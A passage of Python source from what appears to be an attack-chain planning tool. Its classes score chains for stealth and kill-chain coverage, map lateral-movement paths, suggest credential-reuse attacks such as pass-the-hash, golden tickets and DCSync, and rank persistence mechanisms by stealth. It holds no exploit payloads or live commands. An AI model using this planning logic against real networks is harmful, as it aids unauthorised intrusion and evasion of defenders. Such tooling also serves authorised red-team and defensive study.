            'detection': self._calculate_detection_metrics(nodes),
            'success': self._calculate_success_metrics(nodes, edges),
            'coverage': self._calculate_coverage_metrics(nodes)
        }
        
        # Calculate overall score
        self.metrics['overall_score'] = self._calculate_overall_score()
        
        return self.metrics
    
    def _calculate_basic_metrics(self, nodes: List[Dict], edges: List[Dict]) -> Dict:
        """Calculate basic chain metrics"""
        return {
            'node_count': len(nodes),
            'edge_count': len(edges),
            'density': len(edges) / max(len(nodes) * (len(nodes) - 1) / 2, 1),
            'unique_techniques': len(set(n.get('type', '') for n in nodes)),
            'has_entry_point': any(n.get('type', '').lower() in ['phish', 'exploit', 'initial'] 
                                  for n in nodes),
            'has_objective': any(n.get('type', '').lower() in ['exfil', 'impact', 'ransom'] 
                                for n in nodes)
        }
    
    def _calculate_complexity_metrics(self, nodes: List[Dict], edges: List[Dict]) -> Dict:
        """Calculate complexity metrics"""
        # Calculate depth (longest path)
        depth = self._calculate_depth(nodes, edges)
        
        # Calculate branching factor
        out_degrees = {}
        for edge in edges:
            src = edge.get('source', '')
            out_degrees[src] = out_degrees.get(src, 0) + 1
        
        avg_branching = sum(out_degrees.values()) / max(len(out_degrees), 1)
        
        return {
            'depth': depth,
            'average_branching_factor': round(avg_branching, 2),
            'max_branching_factor': max(out_degrees.values()) if out_degrees else 0,
            'parallel_paths': len([d for d in out_degrees.values() if d > 1]),
            'cyclomatic_complexity': len(edges) - len(nodes) + 2
        }
    
    def _calculate_depth(self, nodes: List[Dict], edges: List[Dict]) -> int:
        """Calculate maximum depth of chain"""
        if not nodes:
            return 0
        
        # Build adjacency list
        adj = {n.get('id'): [] for n in nodes}
        in_degree = {n.get('id'): 0 for n in nodes}
        
        for edge in edges:
            src, tgt = edge.get('source'), edge.get('target')
            if src in adj:
                adj[src].append(tgt)
            if tgt in in_degree:
                in_degree[tgt] += 1
        
        # Find entry points
        entry_points = [nid for nid, deg in in_degree.items() if deg == 0]
        
        # BFS to find max depth
        max_depth = 0
        for entry in entry_points:
            visited = {entry: 1}
            queue = [entry]
            
            while queue:
                node = queue.pop(0)
                for neighbor in adj.get(node, []):
                    if neighbor not in visited:
                        visited[neighbor] = visited[node] + 1
                        queue.append(neighbor)
                        max_depth = max(max_depth, visited[neighbor])
        
        return max_depth
    
    def _calculate_risk_metrics(self, nodes: List[Dict]) -> Dict:
        """Calculate risk-related metrics"""
        stealth_values = [n.get('stealth', 0.5) for n in nodes]
        noise_values = [n.get('noise_level', 0.5) for n in nodes]
        
        return {
            'average_stealth': round(sum(stealth_values) / max(len(stealth_values), 1), 2),
            'min_stealth': round(min(stealth_values) if stealth_values else 0, 2),
            'average_noise': round(sum(noise_values) / max(len(noise_values), 1), 2),
            'max_noise': round(max(noise_values) if noise_values else 0, 2),
            'high_risk_nodes': sum(1 for n in noise_values if n > 0.7),
            'detection_probability': round(1 - min(0.95, sum(1-n for n in noise_values) / max(len(noise_values), 1)), 2)
        }
    
    def _calculate_timing_metrics(self, nodes: List[Dict]) -> Dict:
        """Calculate timing metrics"""
        durations = [n.get('duration', 60) for n in nodes]
        
        return {
            'total_duration_seconds': sum(durations),
            'total_duration_minutes': round(sum(durations) / 60, 1),
            'average_duration_seconds': round(sum(durations) / max(len(durations), 1), 1),
            'min_duration': min(durations) if durations else 0,
            'max_duration': max(durations) if durations else 0,
            'estimated_dwell_time_hours': round(sum(durations) / 3600, 1)
        }
    
    def _calculate_detection_metrics(self, nodes: List[Dict]) -> Dict:
        """Calculate detection-related metrics"""
        detectable = sum(1 for n in nodes if n.get('noise_level', 0.5) > 0.5)
        
        return {
            'easily_detectable_nodes': detectable,
            'detection_coverage_needed': round(detectable / max(len(nodes), 1), 2),
            'evasion_techniques_used': sum(1 for n in nodes if 'evas' in n.get('type', '').lower()),
            'cleanup_steps_included': sum(1 for n in nodes if 'clean' in n.get('type', '').lower())
        }
    
    def _calculate_success_metrics(self, nodes: List[Dict], edges: List[Dict]) -> Dict:
        """Calculate success probability metrics"""
        success_probs = [n.get('success_probability', 0.7) for n in nodes]
        
        # Chain success = product of individual probabilities
        chain_success = 1.0
        for prob in success_probs:
            chain_success *= prob
        
        return {
            'average_node_success': round(sum(success_probs) / max(len(success_probs), 1), 2),
            'min_node_success': round(min(success_probs) if success_probs else 0, 2),
            'chain_success_probability': round(chain_success, 4),
            'critical_path_length': len([n for n in nodes if n.get('critical', False)])
        }
    
    def _calculate_coverage_metrics(self, nodes: List[Dict]) -> Dict:
        """Calculate kill chain coverage metrics"""
        kill_chain_phases = {
            'reconnaissance': False,
            'weaponization': False,
            'delivery': False,
            'exploitation': False,
            'installation': False,
            'command_control': False,
            'actions_objectives': False
        }
        
        phase_keywords = {
            'reconnaissance': ['recon', 'scan', 'osint'],
            'weaponization': ['payload', 'weapon', 'craft'],
            'delivery': ['phish', 'email', 'web', 'usb'],
            'exploitation': ['exploit', 'vuln', 'rce'],
            'installation': ['persist', 'install', 'backdoor'],
            'command_control': ['c2', 'beacon', 'callback'],
            'actions_objectives': ['exfil', 'impact', 'collect', 'ransom']
        }
        
        for node in nodes:
            node_type = node.get('type', '').lower()
            for phase, keywords in phase_keywords.items():
                if any(kw in node_type for kw in keywords):
                    kill_chain_phases[phase] = True
        
        covered = sum(1 for v in kill_chain_phases.values() if v)
        
        return {
            'kill_chain_phases_covered': covered,
            'kill_chain_coverage_percent': round(covered / len(kill_chain_phases) * 100, 1),
            'phase_coverage': kill_chain_phases,
            'gaps': [phase for phase, covered in kill_chain_phases.items() if not covered]
        }
    
    def _calculate_overall_score(self) -> int:
        """Calculate overall chain quality score (0-100)"""
        score = 50  # Base score
        
        # Basic metrics contribution
        basic = self.metrics['basic']
        if basic['has_entry_point']:
            score += 10
        if basic['has_objective']:
            score += 10
        
        # Coverage contribution
        coverage = self.metrics['coverage']
        score += int(coverage['kill_chain_coverage_percent'] * 0.2)
        
        # Risk contribution (lower is better)
        risk = self.metrics['risk']
        score += int((1 - risk['detection_probability']) * 10)
        
        # Complexity penalty for excessive complexity
        complexity = self.metrics['complexity']
        if complexity['depth'] > 10:
            score -= 5
        
        return max(0, min(100, score))
    
    def get_metrics_summary(self) -> str:
        """Get human-readable metrics summary"""
        if not self.metrics:
            return "No metrics calculated yet."
        
        return f"""
Chain Quality Score: {self.metrics['overall_score']}/100

üìä BASIC: {self.metrics['basic']['node_count']} nodes, {self.metrics['basic']['edge_count']} edges
üîÄ COMPLEXITY: Depth {self.metrics['complexity']['depth']}, Branching {self.metrics['complexity']['average_branching_factor']}
‚ö†Ô∏è RISK: Detection prob {self.metrics['risk']['detection_probability']}, Avg stealth {self.metrics['risk']['average_stealth']}
‚è±Ô∏è TIMING: Total {self.metrics['timing']['total_duration_minutes']} min, Dwell {self.metrics['timing']['estimated_dwell_time_hours']} hr
‚úÖ SUCCESS: Chain probability {self.metrics['success']['chain_success_probability']}
üìà COVERAGE: Kill chain {self.metrics['coverage']['kill_chain_coverage_percent']}%
"""


# =============================================================================
# NETWORK TOPOLOGY INTELLIGENCE ENGINE - Visual Network Mapping
# =============================================================================

class NetworkTopologyEngine:
    """
    Advanced network topology analysis and visualization engine.
    Maps attack paths to actual network infrastructure.
    """
    
    def __init__(self):
        self.topology: Dict[str, Any] = {}
        self.segments: Dict[str, List[str]] = {}
        self.trust_zones: Dict[str, Dict] = {}
        self.route_cache: Dict[str, List[Dict]] = {}
        self.discovered_assets: List[Dict] = []
        self.network_services: Dict[str, List[Dict]] = {}
        self.firewall_rules: List[Dict] = []
        self.vlan_config: Dict[int, Dict] = {}
        
    def build_topology_from_scan(self, scan_results: Dict) -> Dict[str, Any]:
        """Build network topology from scan results."""
        self.topology = {
            'nodes': [],
            'edges': [],
            'subnets': {},
            'gateways': [],
            'segments': {},
            'trust_boundaries': []
        }
        
        # Extract hosts from scan
        hosts = scan_results.get('hosts', [])
        for host in hosts:
            node = {
                'id': host.get('ip', f"host_{len(self.topology['nodes'])}"),
                'ip': host.get('ip'),
                'hostname': host.get('hostname', 'Unknown'),
                'os': host.get('os', 'Unknown'),
                'services': host.get('services', []),
                'vulnerabilities': host.get('vulnerabilities', []),
                'segment': self._determine_segment(host.get('ip', '')),
                'trust_level': self._calculate_trust_level(host),
                'criticality': self._assess_criticality(host)
            }
            self.topology['nodes'].append(node)
            
            # Auto-discover network edges
            for service in host.get('services', []):
                if service.get('type') in ['ssh', 'rdp', 'winrm', 'smb']:
                    self._discover_lateral_paths(host, service)
                    
        # Build subnet graph
        self._build_subnet_graph()
        
        # Identify trust boundaries
        self._identify_trust_boundaries()
        
        return self.topology
        
    def _determine_segment(self, ip: str) -> str:
        """Determine network segment from IP."""
        if not ip:
            return 'unknown'
            
        octets = ip.split('.')
        if len(octets) < 3:
            return 'unknown'
            
        # Common segmentation patterns
        second_octet = int(octets[1]) if octets[1].isdigit() else 0
        third_octet = int(octets[2]) if octets[2].isdigit() else 0
        
        segment_map = {
            (10, range(0, 10)): 'core_infrastructure',
            (10, range(10, 20)): 'dmz',
            (10, range(20, 30)): 'internal_servers',
            (10, range(30, 50)): 'workstations',
            (10, range(50, 60)): 'development',
            (10, range(60, 70)): 'security',
            (10, range(100, 200)): 'iot_devices',
            (172, range(16, 32)): 'private_network',
            (192, 168): 'small_office'
        }
        
        if octets[0] == '10':
            for (first, second_range), segment in segment_map.items():
                if first == 10 and second_octet in second_range:
                    return segment
                    
        return f"segment_{octets[0]}_{octets[1]}"
        
    def _calculate_trust_level(self, host: Dict) -> str:
        """Calculate trust level of host."""
        services = host.get('services', [])
        os_info = host.get('os', '').lower()
        
        # High trust indicators
        high_trust = ['domain controller', 'kerberos', 'ldap']
        # Medium trust indicators
        medium_trust = ['sql', 'database', 'file server']
        # Low trust (externally accessible)
        low_trust = ['http', 'https', 'ftp']
        
        service_types = [s.get('type', '').lower() for s in services]
        
        if any(ht in os_info or ht in str(service_types) for ht in high_trust):
            return 'high'
        elif any(mt in str(service_types) for mt in medium_trust):
            return 'medium'
        elif any(lt in str(service_types) for lt in low_trust):
            return 'low'
            
        return 'medium'
        
    def _assess_criticality(self, host: Dict) -> int:
        """Assess criticality score 1-10."""
        score = 5
        
        services = host.get('services', [])
        vulns = host.get('vulnerabilities', [])
        
        # Critical services increase score
        critical_services = ['domain controller', 'sql', 'ldap', 'kerberos', 'radius']
        for service in services:
            if any(cs in service.get('type', '').lower() for cs in critical_services):
                score += 2
                
        # Vulnerabilities modify score
        for vuln in vulns:
            cvss = vuln.get('cvss', 5)
            if cvss >= 9:
                score += 2
            elif cvss >= 7:
                score += 1
                
        return min(10, max(1, score))
        
    def _discover_lateral_paths(self, host: Dict, service: Dict):
        """Discover lateral movement paths."""
        source_ip = host.get('ip')
        service_type = service.get('type', '').lower()
        
        # Build potential lateral edges
        edge = {
            'source': source_ip,
            'target': None,  # Will be filled during correlation
            'method': service_type,
            'requirements': self._get_lateral_requirements(service_type),
            'detected_by': self._get_detection_methods(service_type)
        }
        
        self.topology.setdefault('potential_lateral', []).append(edge)
        
    def _get_lateral_requirements(self, method: str) -> List[str]:
        """Get requirements for lateral movement method."""
        requirements_map = {
            'ssh': ['ssh_credentials', 'network_access'],
            'rdp': ['rdp_credentials', 'network_access', 'rdp_enabled'],
            'smb': ['smb_credentials', 'smb_access', 'admin_share_access'],
            'winrm': ['winrm_credentials', 'winrm_enabled', 'port_5985_5986'],
            'wmi': ['admin_credentials', 'wmi_enabled'],
            'psexec': ['admin_credentials', 'admin_share', 'smb_access'],
            'dcom': ['admin_credentials', 'dcom_enabled']
        }
        return requirements_map.get(method, ['unknown_requirements'])
        
    def _get_detection_methods(self, method: str) -> List[str]:
        """Get common detection methods for lateral technique."""
        detection_map = {
            'ssh': ['auth_logs', 'network_flow', 'session_tracking'],
            'rdp': ['event_4624', 'event_4778', 'network_flow', 'rdp_logs'],
            'smb': ['event_5140', 'event_5145', 'network_flow'],
            'winrm': ['event_4688', 'event_91', 'powershell_logs'],
            'wmi': ['event_5857', 'event_5858', 'wmi_trace'],
            'psexec': ['event_7045', 'event_4688', 'file_creation']
        }
        return detection_map.get(method, ['unknown'])
        
    def _build_subnet_graph(self):
        """Build subnet connectivity graph."""
        subnets = {}
        
        for node in self.topology.get('nodes', []):
            ip = node.get('ip', '')
            if '.' in ip:
                octets = ip.split('.')
                subnet = f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
                
                if subnet not in subnets:
                    subnets[subnet] = {
                        'hosts': [],
                        'gateways': [],
                        'segment': node.get('segment'),
                        'trust_level': node.get('trust_level')
                    }
                subnets[subnet]['hosts'].append(node)
                
        self.topology['subnets'] = subnets
        
    def _identify_trust_boundaries(self):
        """Identify trust boundaries between segments."""
        segments = {}
        
        for node in self.topology.get('nodes', []):
            seg = node.get('segment', 'unknown')
            if seg not in segments:
                segments[seg] = {'trust_level': node.get('trust_level'), 'nodes': []}
            segments[seg]['nodes'].append(node)
            
        # Build trust boundaries
        boundaries = []
        segment_list = list(segments.keys())
        
        for i, seg1 in enumerate(segment_list):
            for seg2 in segment_list[i+1:]:
                trust1 = segments[seg1].get('trust_level', 'medium')
                trust2 = segments[seg2].get('trust_level', 'medium')
                
                if trust1 != trust2:
                    boundaries.append({
                        'from_segment': seg1,
                        'to_segment': seg2,
                        'from_trust': trust1,
                        'to_trust': trust2,
                        'crossing_difficulty': self._calculate_boundary_difficulty(trust1, trust2)
                    })
                    
        self.topology['trust_boundaries'] = boundaries
        self.topology['segments'] = segments
        
    def _calculate_boundary_difficulty(self, from_trust: str, to_trust: str) -> str:
        """Calculate difficulty of crossing trust boundary."""
        trust_levels = {'low': 1, 'medium': 2, 'high': 3}
        
        from_level = trust_levels.get(from_trust, 2)
        to_level = trust_levels.get(to_trust, 2)
        
        diff = to_level - from_level
        
        if diff >= 2:
            return 'very_hard'
        elif diff == 1:
            return 'hard'
        elif diff == 0:
            return 'moderate'
        elif diff == -1:
            return 'easy'
        else:
            return 'trivial'
            
    def find_shortest_attack_path(self, start: str, target: str) -> List[Dict]:
        """Find shortest attack path between two nodes."""
        cache_key = f"{start}:{target}"
        if cache_key in self.route_cache:
            return self.route_cache[cache_key]
            
        # Build adjacency graph
        graph = {}
        for node in self.topology.get('nodes', []):
            node_id = node.get('id')
            graph[node_id] = []
            
            # Find connected nodes (same subnet or with lateral path)
            for edge in self.topology.get('potential_lateral', []):
                if edge.get('source') == node_id:
                    graph[node_id].append({
                        'target': edge.get('target'),
                        'method': edge.get('method'),
                        'cost': len(edge.get('requirements', []))
                    })
                    
        # Dijkstra's algorithm
        import heapq
        
        distances = {start: 0}
        paths = {start: []}
        pq = [(0, start, [])]
        visited = set()
        
        while pq:
            dist, current, path = heapq.heappop(pq)
            
            if current in visited:
                continue
                
            visited.add(current)
            
            if current == target:
                result = path
                self.route_cache[cache_key] = result
                return result
                
            for neighbor in graph.get(current, []):
                next_node = neighbor.get('target')
                if next_node and next_node not in visited:
                    new_dist = dist + neighbor.get('cost', 1)
                    if next_node not in distances or new_dist < distances[next_node]:
                        distances[next_node] = new_dist
                        new_path = path + [{
                            'from': current,
                            'to': next_node,
                            'method': neighbor.get('method')
                        }]
                        paths[next_node] = new_path
                        heapq.heappush(pq, (new_dist, next_node, new_path))
                        
        return []
        
    def generate_topology_visualization(self) -> Dict[str, Any]:
        """Generate visualization data for network topology."""
        viz_data = {
            'nodes': [],
            'edges': [],
            'groups': [],
            'annotations': []
        }
        
        # Color coding by segment
        segment_colors = {
            'core_infrastructure': '#ff4444',
            'dmz': '#ffaa00',
            'internal_servers': '#44ff44',
            'workstations': '#4444ff',
            'development': '#ff44ff',
            'security': '#00ffff',
            'iot_devices': '#888888'
        }
        
        for node in self.topology.get('nodes', []):
            segment = node.get('segment', 'unknown')
            viz_node = {
                'id': node.get('id'),
                'label': f"{node.get('hostname', 'Unknown')}\n{node.get('ip', '')}",
                'color': segment_colors.get(segment, '#ffffff'),
                'size': 10 + node.get('criticality', 5) * 3,
                'shape': self._get_node_shape(node),
                'group': segment,
                'tooltip': f"OS: {node.get('os')}\nServices: {len(node.get('services', []))}\nVulns: {len(node.get('vulnerabilities', []))}"
            }
            viz_data['nodes'].append(viz_node)
            
        # Add edges for lateral movement
        for edge in self.topology.get('potential_lateral', []):
            viz_edge = {
                'from': edge.get('source'),
                'to': edge.get('target'),
                'label': edge.get('method', ''),
                'arrows': 'to',
                'dashes': True,
                'color': {'color': '#ff8800', 'opacity': 0.6}
            }
            viz_data['edges'].append(viz_edge)
            
        # Add trust boundary annotations
        for boundary in self.topology.get('trust_boundaries', []):
            annotation = {
                'type': 'trust_boundary',
                'from_segment': boundary.get('from_segment'),
                'to_segment': boundary.get('to_segment'),
                'difficulty': boundary.get('crossing_difficulty'),
                'style': 'dashed_line'
            }
            viz_data['annotations'].append(annotation)
            
        return viz_data
        
    def _get_node_shape(self, node: Dict) -> str:
        """Get visualization shape for node type."""
        services = [s.get('type', '').lower() for s in node.get('services', [])]
        
        if 'domain controller' in node.get('os', '').lower() or 'ldap' in services:
            return 'star'
        elif any(db in services for db in ['sql', 'mysql', 'postgresql', 'oracle']):
            return 'database'
        elif 'http' in services or 'https' in services:
            return 'triangle'
        elif 'router' in node.get('hostname', '').lower():
            return 'diamond'
        else:
            return 'dot'


# =============================================================================
# CREDENTIAL TRACKING & HARVESTING ENGINE - Credential Intelligence
# =============================================================================

class CredentialTrackingEngine:
    """
    Advanced credential tracking, harvesting, and reuse intelligence.
    Tracks credentials across attack chain for maximum reuse potential.
    """
    
    def __init__(self):
        self.credentials: Dict[str, Dict] = {}
        self.credential_graph: Dict[str, List[str]] = {}
        self.harvest_sources: Dict[str, List[str]] = {}
        self.reuse_opportunities: List[Dict] = []
        self.credential_age: Dict[str, datetime] = {}
        self.access_matrix: Dict[str, Dict[str, str]] = {}
        
    def register_credential(self, cred_id: str, credential: Dict):
        """Register a discovered credential."""
        self.credentials[cred_id] = {
            'username': credential.get('username'),
            'domain': credential.get('domain'),
            'type': credential.get('type', 'unknown'),  # password, hash, token, key
            'value_hash': hashlib.sha256(
                credential.get('value', '').encode()
            ).hexdigest()[:16] if credential.get('value') else None,
            'source': credential.get('source'),
            'source_technique': credential.get('technique'),
            'privilege_level': credential.get('privilege_level', 'user'),
            'scope': credential.get('scope', []),
            'expiration': credential.get('expiration'),
            'discovered_at': datetime.now().isoformat(),
            'used_count': 0,
            'successful_uses': [],
            'failed_uses': []
        }
        
        self.credential_age[cred_id] = datetime.now()
        self._update_credential_graph(cred_id, credential)
        self._find_reuse_opportunities(cred_id)
        
    def _update_credential_graph(self, cred_id: str, credential: Dict):
        """Update credential relationship graph."""
        username = credential.get('username', '')
        domain = credential.get('domain', '')
        
        # Link credentials by username
        key = f"{domain}\\{username}" if domain else username
        
        if key not in self.credential_graph:
            self.credential_graph[key] = []
        self.credential_graph[key].append(cred_id)
        
        # Track harvest source
        source = credential.get('source', 'unknown')
        if source not in self.harvest_sources:
            self.harvest_sources[source] = []
        self.harvest_sources[source].append(cred_id)
        
    def _find_reuse_opportunities(self, cred_id: str):
        """Identify credential reuse opportunities."""
        cred = self.credentials.get(cred_id, {})
        username = cred.get('username')
        domain = cred.get('domain')
        priv_level = cred.get('privilege_level')
        
        opportunities = []
        
        # Check for password reuse across systems
        if cred.get('type') == 'password':
            opportunities.append({
                'type': 'password_spray',
                'description': f"Try {username} across other systems",
                'technique': 'T1110.003',
                'success_probability': 0.3
            })
            
        # Check for hash reuse (pass-the-hash)
        if cred.get('type') in ['ntlm_hash', 'hash']:
            opportunities.append({
                'type': 'pass_the_hash',
                'description': f"Use hash for {username} on Windows systems",
                'technique': 'T1550.002',
                'success_probability': 0.7
            })
            
        # Check for Kerberos ticket opportunities
        if domain and priv_level in ['admin', 'domain_admin']:
            opportunities.extend([
                {
                    'type': 'golden_ticket',
                    'description': f"Create golden ticket using {username}",
                    'technique': 'T1558.001',
                    'success_probability': 0.9 if priv_level == 'domain_admin' else 0.1
                },
                {
                    'type': 'silver_ticket',
                    'description': f"Create service-specific ticket",
                    'technique': 'T1558.002',
                    'success_probability': 0.8
                }
            ])
            
        # Token-based opportunities
        if cred.get('type') == 'token':
            opportunities.append({
                'type': 'token_impersonation',
                'description': f"Impersonate {username} using token",
                'technique': 'T1134.001',
                'success_probability': 0.85
            })
            
        for opp in opportunities:
            opp['credential_id'] = cred_id
            self.reuse_opportunities.append(opp)
            
    def record_credential_use(self, cred_id: str, target: str, success: bool):
        """Record credential usage attempt."""
        if cred_id in self.credentials:
            self.credentials[cred_id]['used_count'] += 1
            
            record = {
                'target': target,
                'timestamp': datetime.now().isoformat(),
                'success': success
            }
            
            if success:
                self.credentials[cred_id]['successful_uses'].append(record)
                self._update_access_matrix(cred_id, target, 'confirmed')
            else:
                self.credentials[cred_id]['failed_uses'].append(record)
                self._update_access_matrix(cred_id, target, 'failed')
                
    def _update_access_matrix(self, cred_id: str, target: str, status: str):
        """Update credential-to-target access matrix."""
        if cred_id not in self.access_matrix:
            self.access_matrix[cred_id] = {}
        self.access_matrix[cred_id][target] = status
        
    def suggest_credential_attacks(self, available_techniques: List[str]) -> List[Dict]:
        """Suggest credential-based attacks based on harvested creds."""
        suggestions = []
        
        for cred_id, cred in self.credentials.items():
            cred_type = cred.get('type')
            priv_level = cred.get('privilege_level')
            
            # Suggest attacks based on credential type
            if cred_type == 'password':
                if 'credential_dumping' in available_techniques:
                    suggestions.append({
                        'attack': 'Credential Dumping',
                        'using_credential': cred_id,
                        'technique': 'T1003',
                        'rationale': f"Use {cred.get('username')} to access LSASS"
                    })
                    
            if priv_level in ['admin', 'local_admin', 'domain_admin']:
                suggestions.extend([
                    {
                        'attack': 'DCSync',
                        'using_credential': cred_id,
                        'technique': 'T1003.006',
                        'rationale': 'Extract all domain hashes'
                    },
                    {
                        'attack': 'Remote Service Exploitation',
                        'using_credential': cred_id,
                        'technique': 'T1021',
                        'rationale': 'Lateral movement with admin rights'
                    }
                ])
                
        return suggestions
        
    def generate_credential_report(self) -> Dict[str, Any]:
        """Generate comprehensive credential intelligence report."""
        return {
            'summary': {
                'total_credentials': len(self.credentials),
                'by_type': self._count_by_type(),
                'by_privilege': self._count_by_privilege(),
                'harvest_sources': len(self.harvest_sources)
            },
            'credentials': list(self.credentials.values()),
            'reuse_opportunities': self.reuse_opportunities,
            'access_matrix': self.access_matrix,
            'recommendations': self._generate_credential_recommendations()
        }
        
    def _count_by_type(self) -> Dict[str, int]:
        """Count credentials by type."""
        counts = {}
        for cred in self.credentials.values():
            cred_type = cred.get('type', 'unknown')
            counts[cred_type] = counts.get(cred_type, 0) + 1
        return counts
        
    def _count_by_privilege(self) -> Dict[str, int]:
        """Count credentials by privilege level."""
        counts = {}
        for cred in self.credentials.values():
            priv = cred.get('privilege_level', 'unknown')
            counts[priv] = counts.get(priv, 0) + 1
        return counts
        
    def _generate_credential_recommendations(self) -> List[str]:
        """Generate recommendations for credential exploitation."""
        recs = []
        
        # Check for high-value credentials
        admin_creds = [c for c in self.credentials.values() 
                      if c.get('privilege_level') in ['admin', 'domain_admin']]
        if admin_creds:
            recs.append(f"üîë {len(admin_creds)} admin credential(s) available for privilege escalation")
            
        # Check for reuse opportunities
        if len(self.reuse_opportunities) > 5:
            recs.append(f"üîÑ {len(self.reuse_opportunities)} credential reuse opportunities identified")
            
        # Check credential freshness
        old_creds = []
        for cred_id, age in self.credential_age.items():
            if (datetime.now() - age).days > 7:
                old_creds.append(cred_id)
        if old_creds:
            recs.append(f"‚ö†Ô∏è {len(old_creds)} credential(s) may be stale (>7 days old)")
            
        return recs


# =============================================================================
# PERSISTENCE MECHANISM MANAGER - Long-Term Access Control
# =============================================================================

class PersistenceMechanismManager:
    """
    Advanced persistence mechanism tracking and management.
    Ensures maintained access throughout attack chain execution.
    """
    
    # All known persistence techniques with details
    PERSISTENCE_TECHNIQUES = {
        'T1547.001': {
            'name': 'Registry Run Keys',
            'os': ['windows'],
            'stealth': 3,
            'reliability': 8,
            'detection_methods': ['registry_monitoring', 'autoruns'],
            'cleanup_difficulty': 'easy'
        },
        'T1547.004': {
            'name': 'Winlogon Helper DLL',
            'os': ['windows'],
            'stealth': 5,
            'reliability': 9,
            'detection_methods': ['registry_monitoring', 'dll_monitoring'],
            'cleanup_difficulty': 'moderate'
        },
        'T1053.005': {
            'name': 'Scheduled Task',
            'os': ['windows'],
            'stealth': 4,
            'reliability': 8,
            'detection_methods': ['task_scheduler_logs', 'sysmon'],
            'cleanup_difficulty': 'easy'
        },
        'T1543.003': {
            'name': 'Windows Service',
            'os': ['windows'],
            'stealth': 5,
            'reliability': 9,
            'detection_methods': ['service_creation_events', 'autoruns'],
            'cleanup_difficulty': 'moderate'
        },
        'T1546.003': {
            'name': 'WMI Event Subscription',
            'os': ['windows'],
            'stealth': 7,
            'reliability': 8,
            'detection_methods': ['wmi_logging', 'sysmon'],
            'cleanup_difficulty': 'hard'
        },
        'T1136.001': {
            'name': 'Local Account',
            'os': ['windows', 'linux', 'macos'],
            'stealth': 2,
            'reliability': 7,
            'detection_methods': ['account_creation_events', 'user_enumeration'],
            'cleanup_difficulty': 'easy'
        },
        'T1098': {
            'name': 'Account Manipulation',
            'os': ['windows', 'linux', 'macos'],
            'stealth': 4,
            'reliability': 8,
            'detection_methods': ['account_modification_events'],
            'cleanup_difficulty': 'moderate'
        },
        'T1037.001': {
            'name': 'Logon Script',
            'os': ['windows'],
            'stealth': 4,
            'reliability': 7,
            'detection_methods': ['gpo_monitoring', 'script_execution'],
            'cleanup_difficulty': 'moderate'
        },
        'T1505.003': {
            'name': 'Web Shell',
            'os': ['windows', 'linux'],
            'stealth': 5,
            'reliability': 7,
            'detection_methods': ['file_monitoring', 'web_logs', 'network_traffic'],
            'cleanup_difficulty': 'moderate'
        },
        'T1556.001': {
            'name': 'Domain Controller Authentication',
            'os': ['windows'],
            'stealth': 8,
            'reliability': 9,
            'detection_methods': ['dc_monitoring', 'replication_monitoring'],
            'cleanup_difficulty': 'very_hard'
        },
        'T1053.003': {
            'name': 'Cron Job',
            'os': ['linux', 'macos'],
            'stealth': 3,
            'reliability': 8,
            'detection_methods': ['cron_monitoring', 'file_monitoring'],
            'cleanup_difficulty': 'easy'
        },
        'T1547.006': {
            'name': 'Kernel Modules',
            'os': ['linux'],
            'stealth': 8,
            'reliability': 9,
            'detection_methods': ['kernel_monitoring', 'rootkit_detection'],
            'cleanup_difficulty': 'very_hard'
        },
        'T1546.004': {
            'name': '.bash_profile / .bashrc',
            'os': ['linux', 'macos'],
            'stealth': 4,
            'reliability': 7,
            'detection_methods': ['file_monitoring', 'shell_history'],
            'cleanup_difficulty': 'easy'
        },
        'T1543.002': {
            'name': 'Systemd Service',
            'os': ['linux'],
            'stealth': 5,
            'reliability': 9,
            'detection_methods': ['systemd_logs', 'service_enumeration'],
            'cleanup_difficulty': 'moderate'
        },
        'T1547.007': {
            'name': 'Plist Modification',
            'os': ['macos'],
            'stealth': 4,
            'reliability': 8,
            'detection_methods': ['plist_monitoring', 'launchd_logs'],
            'cleanup_difficulty': 'easy'
        },
        'T1574.001': {
            'name': 'DLL Search Order Hijacking',
            'os': ['windows'],
            'stealth': 7,
            'reliability': 8,
            'detection_methods': ['dll_monitoring', 'process_monitoring'],
            'cleanup_difficulty': 'moderate'
        }
    }
    
    def __init__(self):
        self.active_mechanisms: Dict[str, Dict] = {}
        self.planned_mechanisms: List[Dict] = []
        self.mechanism_health: Dict[str, str] = {}
        self.beacon_schedule: Dict[str, Dict] = {}
        self.fallback_chain: List[str] = []
        
    def plan_persistence(self, target: Dict, objectives: Dict) -> List[Dict]:
        """Plan optimal persistence mechanisms for target."""
        target_os = target.get('os', 'windows').lower()
        stealth_priority = objectives.get('stealth_priority', 5)
        reliability_priority = objectives.get('reliability_priority', 5)
        
        # Filter techniques for target OS
        applicable = []
        for tech_id, tech in self.PERSISTENCE_TECHNIQUES.items():
            if target_os in tech.get('os', []):
                # Score based on priorities
                score = (
                    tech.get('stealth', 5) * stealth_priority +
                    tech.get('reliability', 5) * reliability_priority
                ) / 10
                applicable.append({
                    'technique_id': tech_id,
                    'name': tech.get('name'),
                    'score': score,
                    'stealth': tech.get('stealth'),
                    'reliability': tech.get('reliability'),
                    'cleanup_difficulty': tech.get('cleanup_difficulty')
                })
                
        # Sort by score
        applicable.sort(key=lambda x: x['score'], reverse=True)
        
        # Recommend primary + backup
        recommendations = []
        if applicable:
            recommendations.append({
                'role': 'primary',
                **applicable[0]
            })
            if len(applicable) > 1:
                recommendations.append({
                    'role': 'backup',
                    **applicable[1]
                })
            if len(applicable) > 2:
                recommendations.append({
                    'role': 'emergency',
                    **applicable[2]
                })
                
        self.planned_mechanisms = recommendations
        return recommendations
        
    def deploy_persistence(self, mechanism_id: str, target: str, config: Dict) -> bool:
        """Deploy a persistence mechanism (simulated)."""
        technique = self.PERSISTENCE_TECHNIQUES.get(mechanism_id, {})
        
        deployment = {
            'mechanism_id': mechanism_id,
            'name': technique.get('name', 'Unknown'),
            'target': target,
            'deployed_at': datetime.now().isoformat(),
            'config': config,
            'status': 'active',
            'last_check': datetime.now().isoformat(),
            'beacon_interval': config.get('beacon_interval', 3600),
            'jitter': config.get('jitter', 0.1)
        }
        
        deployment_id = f"{target}_{mechanism_id}_{int(time.time())}"
        self.active_mechanisms[deployment_id] = deployment
        self.mechanism_health[deployment_id] = 'healthy'
        
        # Set up beacon schedule
        self.beacon_schedule[deployment_id] = {
            'interval': config.get('beacon_interval', 3600),
            'next_beacon': datetime.now(),
            'missed_beacons': 0
        }
        
        return True
        
    def check_mechanism_health(self, deployment_id: str) -> Dict:
        """Check health of persistence mechanism."""
        if deployment_id not in self.active_mechanisms:
            return {'status': 'not_found'}
            
        mechanism = self.active_mechanisms[deployment_id]
